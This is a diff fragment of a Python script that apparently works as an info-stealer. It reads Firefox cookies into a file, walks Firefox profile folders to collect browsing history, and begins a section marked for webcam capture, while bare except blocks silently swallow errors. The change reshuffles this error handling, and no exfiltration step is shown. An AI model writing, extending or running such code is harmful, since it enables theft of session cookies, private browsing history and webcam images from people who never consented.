@@ -100,9 +100,7 @@ try:
             f.write(get_firefox_cookies())
     except:
         pass
-except:
-    pass
-
+        
     profiles_path = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
     profiles = os.listdir(profiles_path)
     history_data = []
@@ -126,7 +124,7 @@ except:
                 conn.close()
         except:
             pass
-else:
+except:
     pass
 #webcam
 with tempfile.TemporaryDirectory() as temp_dir:
